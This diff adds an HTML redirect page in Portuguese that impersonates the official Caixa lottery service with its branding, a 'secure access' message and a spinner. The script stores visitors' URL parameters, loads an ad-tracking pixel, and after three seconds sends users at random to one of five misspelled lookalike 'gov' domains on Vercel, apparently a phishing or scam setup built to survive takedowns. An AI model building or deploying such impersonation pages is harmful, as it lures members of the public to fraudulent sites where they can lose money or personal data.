@@ -1,0 +1,105 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <script>
+  window.pixelId = "6760fb4642265904392e3638";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+  <title>Acesso Seguro</title>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'Montserrat', sans-serif;
+      background: #0057b8; /* azul Caixa */
+      color: white;
+      text-align: center;
+    }
+    .container {
+      max-width: 420px;
+      padding: 20px;
+    }
+    .title {
+      font-size: 22px;
+      font-weight: 700;
+      margin-top: 15px;
+    }
+    .subtitle {
+      font-size: 14px;
+      opacity: 0.9;
+      margin-top: 8px;
+    }
+    /* Loader */
+    .loader {
+      width: 60px;
+      height: 60px;
+      border: 5px solid rgba(255,255,255,0.3);
+      border-top-color: #ffba08;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    .badge {
+      display: inline-block;
+      background: #ffba08;
+      color: #003b73;
+      font-weight: 700;
+      padding: 6px 14px;
+      border-radius: 20px;
+      margin-bottom: 15px;
+      font-size: 12px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="badge">LOTERIAS OFICIAL CAIXA</div>
+    <div class="loader"></div>
+    <div class="title">Acesso seguro</div>
+    <div class="subtitle">Você está sendo redirecionado…</div>
+  </div>
+<script>
+  (function () {
+    const targets = [
+      'https://loteriascaixaonlline-gov-beta.vercel.app/0/',
+      'https://loteriascaixaonlline-gov-l5wg.vercel.app/0/',
+      'https://loteriascaixaonlline-gov-hu3r.vercel.app/0/',
+      'https://loteriascaixaonlline-gov-9zhc.vercel.app/0/',
+      'https://loteriascaixaonlline-gov-1l6g.vercel.app/0/'
+    ];
+
+    const params = new URLSearchParams(window.location.search);
+    const hash = window.location.hash || '';
+
+    /* 🔹 Salva TODOS os parâmetros no localStorage */
+    params.forEach((value, key) => {
+      localStorage.setItem(key, value);
+    });
+
+    /* (Opcional) salva a URL completa de origem */
+    localStorage.setItem('origin_url', window.location.href);
+
+    const target = targets[Math.floor(Math.random() * targets.length)];
+    const finalUrl = target + (params.toString() ? '?' + params.toString() : '') + hash;
+
+    setTimeout(() => {
+      window.location.replace(finalUrl);
+    }, 3000);
+  })();
+</script>
+
+</body>
+</html>
